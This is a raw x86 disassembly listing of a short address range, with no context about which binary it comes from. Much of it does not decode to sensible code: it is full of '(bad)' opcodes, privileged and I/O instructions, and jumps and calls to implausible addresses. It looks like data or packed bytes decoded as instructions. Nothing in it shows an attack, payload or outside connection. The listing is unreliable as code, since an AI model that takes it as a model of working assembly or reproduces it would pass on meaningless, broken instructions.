  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
